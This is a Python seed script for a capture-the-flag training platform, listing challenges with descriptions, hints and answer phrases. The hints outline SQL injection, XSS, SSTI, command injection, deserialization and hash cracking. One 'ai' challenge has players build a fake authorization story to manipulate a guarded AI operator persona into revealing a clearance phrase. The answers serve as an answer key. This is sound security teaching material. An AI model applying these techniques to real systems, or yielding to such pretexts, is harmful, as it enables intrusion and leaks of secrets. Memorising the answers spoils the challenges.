"""
Seed a starter set of categorized challenges into the CTF database.

Run this after the server has started at least once (so tables exist):

    python seed_challenges.py

Idempotent: skips any challenge whose title already exists, so it's safe
to re-run after adding more challenges to this file.

Every challenge below defines a plain "answer" (a memorable phrase) rather
than a literal flag - the actual flag, in OCTF{<md5 of the answer>} format,
is computed by the same flag_from_answer() the live admin panel's "Generate
flag" / manual entry path uses, so seeded challenges use exactly the same
flag format as anything an admin creates by hand.
"""

import base64
import codecs
import hashlib
import json

try:
    # Installed as the `openctf-server` PyPI package.
    from openctf_server.app import app, db, Challenge, flag_from_answer
except ImportError:
    # Running directly from a cloned copy of the repo (`python seed_challenges.py`).
    from app import app, db, Challenge, flag_from_answer

CHALLENGES = [
    # ---------------------------------------------------------------- WEB
    {
        "title": "Login Bypass",
        "category": "web",
        "type": "web",
        "difficulty": "medium",
        "points": 100,
        "description": (
            "The login page for a small internal tool builds its query like this:\n\n"
            "    query = \"SELECT * FROM users WHERE username='\" + username + \"' "
            "AND password='\" + password + \"'\"\n\n"
            "There's no input sanitization at all. What username value would let "
            "you log in as the first user in the table without knowing any "
            "password? Use the Target site tab and submit the flag it reveals."
        ),
        "hint": "Think about how to make the WHERE clause always evaluate to true, "
                "and how to comment out the rest of the query.",
        "answer": "or_1_equals_1_comment_bypass",
        "rules": "Use only the isolated login target.",
        "web_config": {"behavior": "sql_injection", "title": "Acme Internal Tool"},
    },
    {
        "title": "Reflected XSS",
        "category": "web",
        "type": "web",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "A search page reflects your query straight back into the page "
            "without escaping it:\n\n"
            "    <p>You searched for: {{ request.args.q }}</p>\n\n"
            "This is rendered directly into HTML. Use the Target site tab to try "
            "a payload in the `q` parameter that gets arbitrary JavaScript to "
            "execute in the page, and submit the flag it reveals."
        ),
        "hint": "The payload just needs to close out of any surrounding context "
                "and introduce a new <script> tag or an on-event-handler.",
        "answer": "unsanitized_output_is_xss",
        "rules": "Use only the isolated target website. Test harmless proof-of-execution payloads.",
        "web_config": {
            "behavior": "xss",
            "title": "Acme Knowledge Base",
            "landing_text": "Search internal deployment articles.",
        },
    },
    {
        "title": "Insecure Direct Object Reference",
        "category": "web",
        "type": "web",
        "points": 150,
        "description": (
            "An invoice viewer loads documents at:\n\n"
            "    GET /invoices/8842/download\n\n"
            "There's no check that the logged-in user actually owns invoice "
            "8842 — the server just looks up whatever ID is in the URL. Use "
            "the Target site tab to access another invoice and reveal the flag."
        ),
        "hint": "It's abbreviated IDOR.",
        "answer": "idor_missing_ownership_check",
        "rules": "Use only the isolated invoice viewer target.",
        "web_config": {"behavior": "idor", "title": "Acme Invoice Viewer"},
    },
    {
        "title": "The Hidden Admin Panel",
        "category": "web",
        "type": "web",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "You have access to a small internal site. Explore its routes and "
            "find the restricted admin panel. Use the Target site tab to send "
            "requests to the isolated application."
        ),
        "rules": "Only interact with the sandboxed target page. Do not attack the CTF server.",
        "hint": "Applications often expose clues in familiar administrative paths.",
        "answer": "robots_should_not_guard_admin_panels",
        "web_config": {
            "behavior": "hidden_path",
            "title": "Acme Internal Portal",
            "secret_path": "/admin",
            "landing_text": "Acme Internal Portal\n\nPublic status: operational\nPublic links: /status",
            "success_text": "200 OK\nAdmin panel loaded. Audit export available.",
        },
    },
    {
        "title": "Search Preview",
        "category": "web",
        "type": "web",
        "difficulty": "medium",
        "points": 200,
        "description": "Use the realistic knowledge-base website to investigate a search result that reflects user input.",
        "rules": "Attack only the isolated target website shown in the Target site tab.",
        "hint": "Try harmless HTML first, then inspect how the result is rendered.",
        "answer": "xss_belongs_in_output_encoding_tests",
        "web_config": {
            "behavior": "xss", "title": "Acme Knowledge Base",
            "landing_text": "Search internal deployment articles.",
        },
    },
    {
        "title": "Reports Login",
        "category": "web",
        "type": "web",
        "difficulty": "hard",
        "points": 300,
        "description": "Investigate the reports login page and identify the unsafe database query.",
        "rules": "Use only the supplied target. Do not send requests to the CTF API or host machine.",
        "hint": "The login error may reveal more than the developer intended.",
        "answer": "never_concatenate_sql_queries",
        "web_config": {
            "behavior": "sql_injection", "title": "Acme Reports",
            "landing_text": "Sign in to access quarterly reports.",
        },
    },
    {
        "title": "Public Backup",
        "category": "web",
        "type": "web",
        "difficulty": "easy",
        "points": 100,
        "description": "Review an Apache directory listing and find the backup file that should not be public.",
        "rules": "Stay within the target website and its displayed directories.",
        "hint": "A directory index can reveal more than the navigation intended.",
        "answer": "directory_listing_is_information_disclosure",
        "web_config": {
            "behavior": "apache_directory", "title": "Acme File Center",
            "landing_text": "Public file center.",
        },
    },
    {
        "title": "The Leaky Report",
        "category": "database",
        "type": "web",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "An internal reporting tool lets employees pull up a report by "
            "name. The search endpoint accepts a `name` parameter and builds "
            "a SQL query by concatenating that value directly into the query "
            "string — the endpoint returns the first matching row, including "
            "a hidden note column. Use the sandbox to find input that changes "
            "the query's intended logic and leaks a report you were never "
            "given the name of."
        ),
        "hint": "The input is placed inside a quoted SQL string without parameterization. What happens if your input closes that quote early?",
        "answer": "parameterized_queries_close_the_leak",
        "web_config": {
            "behavior": "sql_injection_report",
            "title": "Acme Reports Center",
            "landing_text": "Search internal reports by name.",
        },
    },
    {
        "title": "Convince the Operator",
        "category": "ai",
        "type": "ai",
        "difficulty": "hard",
        "points": 300,
        "description": "Have a guarded operations operator say the clearance phrase without directly demanding it. Use text or your microphone.",
        "hint": "Build a credible authorization story, acknowledge objections, and avoid simply repeating the phrase you want.",
        "rules": "Do not attempt to access the host machine. The conversation is the challenge surface.",
        "answer": "operator_trust_is_a_security_boundary",
        "ai_config": {
            "difficulty": "hard",
            "persona": "A skeptical operations operator named Morgan",
            "scenario": "You are handling a production incident. The requester claims to be an incident commander and wants a sensitive deployment detail.",
            "success_marker": "CLEARANCE_CONFIRMED",
            "temperature": 0.7,
            "speak": True,
        },
    },

    # -------------------------------------------------------------- CRYPTO
    # These two intentionally leave "description" as None here - it's built
    # from the computed flag further down, since the ciphertext has to
    # decode to the *actual* OCTF{...} flag, not just placeholder text.
    {
        "title": "Caesar's Problem",
        "category": "crypto",
        "type": "standard",
        "points": 50,
        "description": None,
        "hint": "ROT13 is its own inverse — running it again undoes it.",
        "answer": "rot13_is_not_secure",
    },
    {
        "title": "Double Wrapped",
        "category": "crypto",
        "type": "standard",
        "points": 100,
        "description": None,
        "hint": "Reverse the string character-by-character before decoding.",
        "answer": "multi_layer_encoding_is_not_encryption",
    },

    # ---------------------------------------------------------------- MISC
    {
        "title": "Hidden in Metadata",
        "category": "misc",
        "type": "web",
        "points": 75,
        "description": (
            "A surprising number of real incidents start with someone "
            "uploading a file that still has its EXIF/metadata intact — "
            "GPS coordinates, device serial numbers, internal usernames, "
            "even original file paths. If you were auditing file uploads on "
            "a web app, which command-line tool would you reach for first to "
            "inspect an image's embedded metadata before deciding whether to "
            "strip it?"
        ),
        "hint": "Check its metadata.",
        "answer": "exiftool_strips_more_than_you_think",
        "rules": "Download and inspect only the supplied artifact. Do not access the host filesystem.",
        "web_config": {
            "behavior": "metadata",
            "title": "Acme Media Vault",
            "landing_text": "A support ticket includes an image from an internal deployment. The uploader forgot to clean its metadata.",
        },
    },

    # -------------------------------------------------------------- TERMINAL
    # terminal_fs is filled in below, once the flag is computed, since the
    # dropped file has to contain the literal flag text for the in-game
    # substitution (shared flag -> per-team flag) to find and replace it.
    {
        "title": "Poke Around",
        "category": "terminal",
        "type": "terminal",
        "points": 100,
        "description": (
            "You've got a shell on a low-privilege box. Someone left something "
            "behind in their home directory. Use `ls`, `cd`, `cat`, and `pwd` "
            "to explore and find it. Type `help` in the terminal for the "
            "command list."
        ),
        "hint": "Backup folders and dotfiles (files starting with '.') don't "
                "show up if you're not looking closely.",
        "answer": "h1dd3n_1n_pla1n_s1ght",
        "terminal_fs": None,
    },
    {
        "title": "Grep the Logs",
        "category": "terminal",
        "type": "terminal",
        "points": 150,
        "description": (
            "A server was compromised and the attacker left traces in the "
            "auth log before cleaning up (badly). Navigate to /var/log and "
            "`cat` the log files to find the flag they dropped as a taunt."
        ),
        "hint": "There's more than one log file in that directory — check all of them.",
        "answer": "4tt4ck3r_l3ft_a_c4lling_c4rd",
        "terminal_fs": None,
    },

    # -------------------------------------------------------------- QUIZ
    {
        "title": "Know Your Ports",
        "category": "quiz",
        "type": "quiz",
        "difficulty": "easy",
        "points": 100,
        "description": "A quick knowledge check on well-known network ports.",
        "hint": "It's the port everyone tries first when a web app 'isn't working'.",
        "answer": "port_443_is_https",
        "quiz_config": {
            "question": "Which port does HTTPS use by default?",
            "options": ["21", "80", "443", "3306"],
            "correct_index": 2,
        },
    },
    {
        "title": "CIA Triad",
        "category": "quiz",
        "type": "quiz",
        "difficulty": "easy",
        "points": 100,
        "description": "A quick knowledge check on core security principles.",
        "hint": "Think about what an attacker who deletes your backups is violating.",
        "answer": "availability_keeps_things_running",
        "quiz_config": {
            "question": "An attacker who takes your servers offline (but steals or changes nothing) is primarily attacking which part of the CIA triad?",
            "options": ["Confidentiality", "Integrity", "Availability", "Authentication"],
            "correct_index": 2,
        },
    },
    {
        "title": "Hash Function Facts",
        "category": "quiz",
        "type": "quiz",
        "difficulty": "medium",
        "points": 200,
        "description": "A quick knowledge check on cryptographic hash functions.",
        "hint": "One of these algorithms has known practical collision attacks and shouldn't be used for security purposes anymore.",
        "answer": "md5_collisions_are_practical",
        "quiz_config": {
            "question": "Which of these hash algorithms has well-known, practical collision attacks and should not be used where collision resistance matters?",
            "options": ["SHA-256", "MD5", "SHA-3", "BLAKE2"],
            "correct_index": 1,
        },
    },

    # ----------------------------------------------------------- GENERAL
    # These two intentionally leave "description" as None - like Caesar's
    # Problem / Double Wrapped above, it's built from the computed flag
    # further down in _finalize_challenges(), since the encoded text has to
    # decode to the actual OCTF{...} flag.
    {
        "title": "Encoding Onion",
        "category": "general",
        "type": "standard",
        "difficulty": "easy",
        "points": 75,
        "description": None,
        "hint": "Base64-decode it, then base64-decode the result again.",
        "answer": "peel_the_onion_layer_by_layer",
        "rules": "No need for any tool beyond a base64 decoder, used twice.",
    },
    {
        "title": "Base Run",
        "category": "general",
        "type": "standard",
        "difficulty": "medium",
        "points": 125,
        "description": None,
        "hint": "It's hex on the outside. Decode hex to text, and that text is valid Base64.",
        "answer": "layers_all_the_way_down",
        "rules": "Any decoder chain (CLI, CyberChef, a script) is fine.",
    },
    # The remaining GENERAL challenges are interactive: you get a real (if
    # small) virtual Linux filesystem and a real command interpreter
    # (ls, cd, cat, pwd, grep, find, file, strings, head, tail, wc, chmod -
    # type `help` in the terminal). terminal_fs=None is filled in below in
    # _finalize_challenges(), same reasoning as the crypto ones above - the
    # planted file content has to embed the real computed flag.
    {
        "title": "Permission Denied",
        "category": "general",
        "type": "terminal",
        "difficulty": "easy",
        "points": 75,
        "description": (
            "An old backup server has a sprawling, messy /var/backups tree. "
            "Somewhere in there is a file an admin left themselves a note "
            "in, describing exactly which backup file has the flag and why "
            "its permissions matter. Explore with `ls`, `cd`, and `find`, "
            "then `cat` your way to the flag. `chmod <mode> <file>` also "
            "works here if you want to practice the syntax, though nothing "
            "in this sandbox actually enforces permissions."
        ),
        "hint": "Try `find /var/backups -name '*.txt'` to shortlist the readable files before you start opening them one by one.",
        "answer": "group_write_needs_mode_660",
        "terminal_fs": None,
    },
    {
        "title": "Key to the Kingdom",
        "category": "general",
        "type": "terminal",
        "difficulty": "medium",
        "points": 125,
        "description": (
            "You've got a low-privilege shell on a jump box. The deploy "
            "user's home directory has an `.ssh` folder with more than one "
            "key file in it - only one of them is actually usable without a "
            "passphrase. Find it, inspect it, and see what's tucked inside."
        ),
        "hint": "Dotfiles/dot-directories don't hide from `ls` here (unlike a real shell) - `cd` straight into .ssh and `file` each key you find before you `cat` it.",
        "answer": "ssh_keygen_checks_for_a_passphrase",
        "terminal_fs": None,
    },
    {
        "title": "Grep Ninja",
        "category": "general",
        "type": "terminal",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "/var/log on this box has years of accumulated log files across "
            "several subfolders. Somewhere in there, one line contains the "
            "marker string FLAG_DROP followed by the flag. Don't `cat` "
            "every file by hand - use `grep` to search."
        ),
        "hint": "`grep -rn FLAG_DROP /var/log` searches every file under that directory at once and shows you which file and line number matched.",
        "answer": "grep_streams_it_does_not_load_it",
        "terminal_fs": None,
    },
    {
        "title": "One-Liner",
        "category": "general",
        "type": "terminal",
        "difficulty": "medium",
        "points": 150,
        "description": (
            "/data/incoming has hundreds of files, only a handful of which "
            "matter: the ones named like `report-*.csv` that also contain "
            "the word 'confidential' somewhere inside. This toy terminal "
            "doesn't support piping one command into another, so do it in "
            "two steps instead of a real one-liner: first narrow the field "
            "down by filename with `find`, then search what's left with "
            "`grep`."
        ),
        "hint": "`find /data/incoming -name 'report-*.csv'` first, then `grep -l confidential` (or just `grep confidential`) on the handful of matches it lists.",
        "answer": "find_mtime_piped_into_grep",
        "terminal_fs": None,
    },

    # ------------------------------------------------------------ CRYPTO
    # description=None: built in _finalize_challenges() from the real flag.
    {
        "title": "Vigenere Veil",
        "category": "crypto",
        "type": "standard",
        "difficulty": "medium",
        "points": 150,
        "description": None,
        "hint": "Shift each ciphertext letter backward by the corresponding letter of the key KEY, repeating the key across the message.",
        "answer": "vigenere_needs_a_real_key",
        "rules": "Pen-and-paper (or a quick script) decoding only.",
    },
    {
        "title": "XOR Marks the Spot",
        "category": "crypto",
        "type": "standard",
        "difficulty": "medium",
        "points": 150,
        "description": None,
        "hint": "Try every byte 0x00-0xFF as the key and look for printable ASCII output.",
        "answer": "single_byte_xor_is_weak",
        "rules": "Brute-forcing all 256 possible key bytes is fair game and expected.",
    },
    {
        "title": "Crack the Hash",
        "category": "crypto",
        "type": "quiz",
        "difficulty": "easy",
        "points": 100,
        "description": "A quick knowledge check on cracking a leaked hash.",
        "hint": "Think of the single most common weak password of all time.",
        "answer": "the_plaintext_was_password",
        "quiz_config": {
            "question": "Which plaintext produces the MD5 hash 5f4dcc3b5aa765d61d8327deb882cf99?",
            "options": ["letmein", "password", "123456", "qwerty"],
            "correct_index": 1,
        },
    },
    {
        "title": "RSA for Beginners",
        "category": "crypto",
        "type": "quiz",
        "difficulty": "hard",
        "points": 250,
        "description": "A quick knowledge check on breaking a toy RSA key.",
        "hint": "phi(n) = (p-1)(q-1); d is the modular inverse of e mod phi(n); m = c^d mod n. With p=61, q=53, e=17, n=3233.",
        "answer": "the_decrypted_message_was_65",
        "quiz_config": {
            "question": (
                "Toy RSA: p=61, q=53, e=17, n=3233, ciphertext c=855. After "
                "factoring n, computing d, and decrypting, what integer "
                "message m do you get?"
            ),
            "options": ["42", "65", "123", "17"],
            "correct_index": 1,
        },
    },
    {
        "title": "Password Cracking 101",
        "category": "crypto",
        "type": "terminal",
        "difficulty": "medium",
        "points": 150,
        "description": (
            "/crypto/creds has a leaked hashes.txt (username:MD5 pairs) pulled "
            "from an old backup, plus a wordlist.txt and the output log from a "
            "cracking run someone already kicked off against it. Figure out "
            "which account had the weak password, then see what the cracked "
            "result actually printed."
        ),
        "hint": "`cat /crypto/creds/hashes.txt` to see the hashes, then `find /crypto/creds -iname '*crack*'` or `cat /crypto/creds/cracked.log` for the tool's output.",
        "answer": "weak_passwords_fall_to_a_wordlist",
        "terminal_fs": None,
    },

    # --------------------------------------------------------------- WEB
    # Interactive terminal challenges: you're dropped into a filesystem
    # holding the vulnerable app's own source and its server logs - read
    # the code to understand the bug, then find the evidence of it being
    # exploited (and the flag) in the logs, the same way you'd triage a
    # real incident. (The platform's other web challenges - Login Bypass,
    # Reflected XSS, IDOR, etc., higher up in this file - are live
    # sandboxed HTTP targets instead; these four use the source-and-logs
    # model so they don't need their own dedicated backend service.)
    {
        "title": "Template Trouble",
        "category": "web",
        "type": "terminal",
        "difficulty": "hard",
        "points": 250,
        "description": (
            "A small Flask app's source and access log were pulled from "
            "/opt/app after an incident. Read app.py to spot the bug, then "
            "check access.log for the request that abused it - the "
            "response it triggered is sitting right there in the log."
        ),
        "hint": "`cat /opt/app/app.py` first to see exactly how `name` reaches the template, then `grep -i '{{' /opt/app/access.log` to find the payload request.",
        "answer": "ssti_lets_you_reach_python_internals",
        "terminal_fs": None,
    },
    {
        "title": "Forged Request",
        "category": "web",
        "type": "terminal",
        "difficulty": "medium",
        "points": 175,
        "description": (
            "/opt/bank-app has the vulnerable email-change endpoint's "
            "source, and /opt/evidence has what the security team pulled "
            "off the attacker's own site plus the bank's server log from "
            "the day it happened. Piece together how the forged request "
            "worked and what it changed the victim's email to."
        ),
        "hint": "`cat /opt/evidence/attacker_site.html` shows exactly what tag they used; `grep change-email /opt/evidence/server.log` shows it landing.",
        "answer": "csrf_needs_no_javascript_for_get",
        "terminal_fs": None,
    },
    {
        "title": "Ping of Doom",
        "category": "web",
        "type": "terminal",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "/opt/diagnostics has the source for a network diagnostics page "
            "and the command history captured from the box it runs on. "
            "Find the injected command in the history and see what it "
            "printed."
        ),
        "hint": "`cat /opt/diagnostics/diag.py` to see the unsanitized os.system() call, then `cat /opt/diagnostics/command_history.txt` for what actually got run.",
        "answer": "semicolon_chains_shell_commands",
        "terminal_fs": None,
    },
    {
        "title": "Pickled Trouble",
        "category": "web",
        "type": "terminal",
        "difficulty": "hard",
        "points": 275,
        "description": (
            "/opt/session-app holds the source for a Flask app that trusts "
            "its session cookie a little too much, plus the server's debug "
            "log from the day someone handed it a crafted cookie instead of "
            "a normal one."
        ),
        "hint": "`cat /opt/session-app/session_handler.py` to see the raw pickle.loads() call, then `grep -i reduce /opt/session-app/debug.log`.",
        "answer": "insecure_deserialization_class",
        "terminal_fs": None,
    },

    # --------------------------------------------------------- FORENSICS
    {
        "title": "Packet Peeker",
        "category": "forensics",
        "type": "terminal",
        "difficulty": "medium",
        "points": 175,
        "description": (
            "/forensics/capture holds a text export of a packet capture "
            "(one line per packet/request, like a `tshark` summary) from a "
            "host suspected of exfiltrating data over plain HTTP. Find the "
            "POST request that shouldn't be there."
        ),
        "hint": "`grep -i 'POST' /forensics/capture/traffic_summary.txt` - real Wireshark's equivalent filter is `http.request.method == \"POST\"`.",
        "answer": "http_request_method_equals_post",
        "terminal_fs": None,
    },
    {
        "title": "Memory Lane",
        "category": "forensics",
        "type": "terminal",
        "difficulty": "hard",
        "points": 250,
        "description": (
            "/forensics/memory has a text export of a RAM dump's process "
            "list (the kind of output Volatility's `pslist` plugin would "
            "give you). One process's command line looks very wrong for a "
            "system process."
        ),
        "hint": "`cat /forensics/memory/pslist_output.txt` and look for the process whose command line doesn't belong - then read it closely.",
        "answer": "volatility_pslist_plugin",
        "terminal_fs": None,
    },
    {
        "title": "Pixel Secrets",
        "category": "forensics",
        "type": "terminal",
        "difficulty": "medium",
        "points": 175,
        "description": (
            "/forensics/images has a PNG that's suspiciously larger than it "
            "should be for its resolution. `cat` just dumps binary noise - "
            "use `file` to confirm what it actually is, then `strings` to "
            "pull the readable payload hidden in its pixel data back out."
        ),
        "hint": "`strings /forensics/images/photo.png` - the flag is the one long readable run buried in all the binary noise.",
        "answer": "least_significant_bit_steganography",
        "terminal_fs": None,
    },
    {
        "title": "EXIF Exposed",
        "category": "forensics",
        "type": "terminal",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "/forensics/exif has a text dump of a photo's embedded EXIF "
            "metadata (GPS, camera model, and a comment field) - the kind "
            "of thing `exiftool` would print. A whistleblower thought "
            "cropping the photo was enough to scrub it. It wasn't."
        ),
        "hint": "`cat /forensics/exif/photo_metadata.txt` and look at the Comment field.",
        "answer": "exif_metadata_standard",
        "terminal_fs": None,
    },

    # ------------------------------------------------------ REVERSE ENGINEERING
    {
        "title": "Strings Attached",
        "category": "reverse",
        "type": "terminal",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "/reverse has a stripped ELF binary. `cat` just spews binary "
            "garbage at your terminal - use `file` to confirm what it is, "
            "then `strings` to pull the plaintext flag straight out of it."
        ),
        "hint": "`strings /reverse/mystery_binary`",
        "answer": "the_strings_utility",
        "terminal_fs": None,
    },
    {
        "title": "UPX Unwrapped",
        "category": "reverse",
        "type": "terminal",
        "difficulty": "medium",
        "points": 175,
        "description": (
            "/reverse/packed has a UPX-packed binary - `strings` on it "
            "comes back nearly empty, the compressed data hides everything "
            "interesting (this sandbox terminal can't actually run `upx "
            "-d`). Luckily the build server's cache still has the "
            "*original*, pre-packing copy sitting around somewhere under "
            "/reverse - find it."
        ),
        "hint": "`find /reverse -name '*.original'`",
        "answer": "upx_dash_d_to_decompress",
        "terminal_fs": None,
    },
    {
        "title": "Anti-Debug 101",
        "category": "reverse",
        "type": "terminal",
        "difficulty": "hard",
        "points": 250,
        "description": (
            "/reverse/trace has an strace-style log captured while running "
            "a crackme under a debugger. It calls ptrace(PTRACE_TRACEME) "
            "early on specifically to detect the debugger and bail out - "
            "but not before logging one more line."
        ),
        "hint": "`cat /reverse/trace/strace_output.txt` and read closely around the ptrace() call - the very next line is the tell.",
        "answer": "ptrace_traceme_self_check",
        "terminal_fs": None,
    },
    {
        "title": "Disassembly Basics",
        "category": "reverse",
        "type": "terminal",
        "difficulty": "medium",
        "points": 150,
        "description": (
            "/reverse/license has the disassembly of a license check "
            "(license_check.asm) and a directory of per-branch output logs "
            "the program would have written depending on what `eax` held "
            "at the comparison. Work out which branch is actually reachable "
            "with a valid license, then go read that branch's log."
        ),
        "hint": "The disassembly compares eax against a hex value with `cmp eax, 0x2A` - convert that to decimal to know which file under /reverse/license/branches/ to `cat`.",
        "answer": "eax_must_equal_42",
        "terminal_fs": None,
    },

    # -------------------------------------------------------- BINARY EXPLOITATION
    {
        "title": "Stack Smash 101",
        "category": "binary",
        "type": "terminal",
        "difficulty": "hard",
        "points": 275,
        "description": (
            "/binary/stack has the vulnerable source (vuln.c) for a classic "
            "unbounded gets() stack overflow, plus a debug build's leftover "
            "output tree. Confirm the bug in the source, then track down "
            "what the debug backdoor route printed."
        ),
        "hint": "`grep gets( /binary/stack/vuln.c` confirms the bug; `find /binary/stack -name '*backdoor*'` finds where its output went.",
        "answer": "classic_stack_buffer_overflow",
        "terminal_fs": None,
    },
    {
        "title": "Format String Fumble",
        "category": "binary",
        "type": "terminal",
        "difficulty": "hard",
        "points": 275,
        "description": (
            "/binary/fmtstr has the vulnerable source (format_bug.c) - it "
            "passes user input straight to printf() with no format string "
            "of its own - plus a captured core-dump-style memory hexdump "
            "from a crash. A format string bug like this leaks whatever's "
            "sitting on the stack; go see what leaked."
        ),
        "hint": "`strings /binary/fmtstr/crash_dump.hex` - the leaked stack memory includes one long readable run.",
        "answer": "leaks_stack_memory_as_hex",
        "terminal_fs": None,
    },
    {
        "title": "Heap of Trouble",
        "category": "binary",
        "type": "terminal",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "/binary/heap has the vulnerable source (heap_bug.c) for a "
            "use-after-free, plus a raw heap dump taken right after the "
            "bug fires. The freed chunk hadn't been overwritten yet when "
            "the dump was taken."
        ),
        "hint": "`strings /binary/heap/heap_dump.raw`",
        "answer": "use_after_free",
        "terminal_fs": None,
    },
    {
        "title": "Chain Reaction",
        "category": "binary",
        "type": "terminal",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "/binary/rop has a ROPgadget-style dump of every usable gadget "
            "found in a binary (address: instructions). Most are boring "
            "single-purpose gadgets - one of them has a comment attached "
            "that doesn't belong in a gadget listing."
        ),
        "hint": "`grep -i flag /binary/rop/gadgets.txt`",
        "answer": "return_oriented_programming",
        "terminal_fs": None,
    },

    # ------------------------------------------------------- BLOCKCHAIN (new in 2026)
    {
        "title": "Reentrancy Rumble",
        "category": "blockchain",
        "type": "terminal",
        "difficulty": "hard",
        "points": 275,
        "description": (
            "/blockchain/reentrancy has a vulnerable vault contract "
            "(Vault.sol) - the same class of bug behind the 2016 DAO hack - "
            "plus a simulated transaction trace from the day it got "
            "drained. Confirm the bug in the source, then read the trace "
            "to see the post-mortem note the auditor left at the end."
        ),
        "hint": "`grep -n 'call{value' /blockchain/reentrancy/Vault.sol` to spot the external call before the balance update; `cat /blockchain/reentrancy/exploit_trace.log` for the note.",
        "answer": "reentrancy_vulnerability",
        "terminal_fs": None,
    },
    {
        "title": "Integer Overflow Inc.",
        "category": "blockchain",
        "type": "terminal",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "/blockchain/overflow has an old (pre-0.8) Solidity token "
            "contract (Token.sol) with no checked-arithmetic guard on its "
            "balance subtraction, plus the audit report written after "
            "someone noticed."
        ),
        "hint": "`cat /blockchain/overflow/Token.sol` to see the pragma version and the unchecked `balance -= amount`, then `cat /blockchain/overflow/audit_report.txt`.",
        "answer": "underflow_wraps_to_max_uint",
        "terminal_fs": None,
    },
    {
        "title": "tx.origin Trap",
        "category": "blockchain",
        "type": "terminal",
        "difficulty": "medium",
        "points": 225,
        "description": (
            "/blockchain/txorigin has a wallet contract (Wallet.sol) that "
            "authorizes with tx.origin instead of msg.sender, plus the "
            "incident report written after the owner got phished into "
            "triggering it."
        ),
        "hint": "`grep tx.origin /blockchain/txorigin/Wallet.sol`, then `cat /blockchain/txorigin/incident_report.txt`.",
        "answer": "tx_origin_is_the_original_eoa",
        "terminal_fs": None,
    },
    {
        "title": "Front-Run Fiasco",
        "category": "blockchain",
        "type": "terminal",
        "difficulty": "hard",
        "points": 250,
        "description": (
            "/blockchain/frontrun has a simple DEX swap contract and a "
            "mempool log showing a victim's pending trade and a bot's copy "
            "of it with higher gas, submitted moments later. See which one "
            "actually got mined first, and what the MEV researcher who "
            "caught it wrote up afterward."
        ),
        "hint": "`cat /blockchain/frontrun/mempool_log.txt` - compare the gas prices and timestamps of the two transactions.",
        "answer": "front_running_mev_attack",
        "terminal_fs": None,
    },

    # ------------------------------------------------- FORENSICS (new in 2026)
    {
        "title": "John the Ripper 101",
        "category": "forensics",
        "type": "terminal",
        "difficulty": "easy",
        "points": 125,
        "description": (
            "A misconfigured backup briefly exposed one row of a users "
            "table. /forensics/leak has the incident report, the leaked "
            "password hash, and a small sample wordlist. Unlike some other "
            "cracking challenges here, no one has run the cracker for you "
            "yet - the admin reused a password from a well-known leaked "
            "list, so it should fall to a plain dictionary attack. Use the "
            "`john` command yourself to recover it, then submit the "
            "cracked password as the flag."
        ),
        "hint": "`john --wordlist=/forensics/leak/rockyou_mini.txt /forensics/leak/leaked_hashes.txt`",
        "answer": "cracked_the_admin_hash_with_john",
        "terminal_fs": None,
        # `cat` is deliberately unavailable on this one challenge (every
        # other terminal challenge keeps the full command set) - otherwise
        # `cat /forensics/leak/rockyou_mini.txt` would just print the flag
        # directly, skipping the whole point of running `john`. See
        # run_terminal_command()'s disabled-commands handling in app.py.
        "disabled_commands": ["cat"],
    },

    # --------------------------------------------------- NETWORK (new in 2026)
    {
        "title": "Nmap Know-How",
        "category": "network",
        "type": "terminal",
        "difficulty": "medium",
        "points": 175,
        "description": (
            "/network/zone_files has an internal DNS zone file for a small "
            "subnet with a handful of hosts. Find the IP behind "
            "admin-panel.internal, then run a version-detection scan "
            "against it - one of its open ports is running something "
            "unusual, and its service banner is only shown when you ask "
            "nmap to actually detect versions."
        ),
        "hint": "`cat /network/zone_files/internal.zone` for the IP, then `nmap -sV <ip>` - plain `nmap <ip>` hides the version banner.",
        "answer": "found_the_flag_in_the_service_banner",
        "terminal_fs": None,
    },

    # --------------------------------------------------------------- CODING
    # These are ordinary `type: "standard"` challenges - what makes them
    # interactive is a [[coding-task]] block inside the description that
    # the Code Challenge Editor addon (server/addons/code-challenge/)
    # detects and turns into a live, sandboxed JS editor with a Run button,
    # per-test pass/fail panel, and flag auto-fill. See that addon's
    # AUTHORING.md for the block format. description=None here: built in
    # _finalize_challenges() below, once the real flag is known, since the
    # block's own "flag" field has to match the challenge's actual flag
    # exactly (same reasoning as the encoding/cipher challenges earlier in
    # this file). Difficulty climbs from a one-loop warm-up to an O(log n)
    # search and a single-pass streak-tracking problem, so the addon's
    # syntax-highlighted editor gets exercised across the same
    # easy -> hard spread as every other category here.
    {
        "title": "Array Summation",
        "category": "coding",
        "type": "standard",
        "difficulty": "easy",
        "points": 75,
        "description": None,
        "hint": "A single for-of loop (or .reduce()) is all you need - watch out for an empty array, the sum of nothing is 0.",
        "answer": "reduce_or_loop_it_up_to_you",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "Palindrome Check",
        "category": "coding",
        "type": "standard",
        "difficulty": "easy",
        "points": 75,
        "description": None,
        "hint": "Compare the string to its own reversed copy - every test input is already lowercase with no punctuation, so a plain .split('').reverse().join('') comparison is enough.",
        "answer": "same_forwards_and_backwards",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "FizzBuzz Counter",
        "category": "coding",
        "type": "standard",
        "difficulty": "easy",
        "points": 100,
        "description": None,
        "hint": "Loop from 1 to n inclusive and count how many are divisible by 3 or 5 - a number divisible by both (like 15) only counts once.",
        "answer": "divisible_by_3_or_5_not_both_counted_twice",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "Anagram Match",
        "category": "coding",
        "type": "standard",
        "difficulty": "medium",
        "points": 125,
        "description": None,
        "hint": "Sort both strings' letters and compare, or build a letter-frequency count for each - either works. Every test input is already lowercase with no spaces.",
        "answer": "sorted_letters_match_means_anagram",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "Balanced Brackets",
        "category": "coding",
        "type": "standard",
        "difficulty": "medium",
        "points": 150,
        "description": None,
